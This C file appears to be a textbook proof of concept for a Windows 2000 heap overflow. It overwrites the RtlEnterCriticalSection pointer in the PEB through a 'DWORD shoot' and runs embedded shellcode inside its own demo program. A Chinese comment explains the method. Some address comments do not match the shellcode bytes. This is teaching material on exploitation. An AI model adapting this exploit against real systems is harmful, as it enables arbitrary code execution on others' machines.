/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
              
POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"
  
file name : heap_PEB.c
author           : failwest 
date        : 2007.04.04
  
description     : demo show of heap overrun, shellcode was executed
                       function pointer of RtlEnterCriticalSection was changed in PEB
                       via DWORD shooting
                       Some address may need to reset via run time debugging
  
Noticed          :      1 only run on windows 2000
                            2 complied with VC 6.0
                            3 build into release version
                            4 used for run time debugging
version          : 1.0
E-mail           : [url=mailto:failwest@gmail.com]failwest@gmail.com[/url]
              
       Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/
/*讲一下为什么这样写：ExitProcess()在结束进程时会调用临界区函数RtlEnterCriticalSection()来同步线程，
而且这个函数指针在PEB中偏移0x20的位置0x7ffdf020，
是的，固定的，但是该函数指针的值在不同的操作系统上不一样，需要先记住，一定要记住，
直接Ctrl+G到0x7ffdf020就可以看到这个函数的指针了，
那么DWORDSHOOT的目标就有了，咱们把shellcode里尾块的块首先按照自己的堆块信息修改好，不同的操作系统堆区起始位置可能不太一样，
需要在shellcode里修改，溢出后，
当h2分配的时候，伪造的指针就会进行DWORDSHOOT，将shellcode的起始位置写入临界区函数RtlEnterCriticalSection()的地址，
这时候堆溢出就会导致异常，
异常了就会调用ExitProcess()函数结束线程，是的，没有错，会取出临界区函数RtlEnterCriticalSection()的指针，
这个指针的值已经被我们shellcode的起始位置覆盖了，
所以就回去执行shellcode，然而！！！！！！
刚刚我说：记住临界区函数RtlEnterCriticalSection()的指针的值，为什么？因为shellcode也会调用临界区函数
RtlEnterCriticalSection()，但是这时候取出的值又是shellcode的值，这咋整？所以刚刚记住的真实地址就有用了，
咱们的shellcode前面不是一堆0x90，在那里修复一下临界区函数RtlEnterCriticalSection()函数指针的值，
然后继续执行shellcode*/
#include <windows.h>

char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    //repaire the pointer which shooted by heap over run
    "\xB8\x20\xF0\xFD\x7F" //MOV EAX,7FFDF020
    "\xBB\x60\x20\xF8\x77" //MOV EBX,77F8AA4C the address here may releated to your OS
    "\x89\x18"             //MOV DWORD PTR DS:[EAX],EBX
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x16\x01\x1A\x00\x00\x10\x00\x00" // head of the ajacent free block
    "\x88\x06\x36\x00\x20\xf0\xfd\x7f";
//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug
//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()
//and will be called by ExitProcess() at last

main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    //__asm int 3 //used to break the process
    //memcpy(h1,shellcode,200); //normal cpy, used to watch the heap
    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}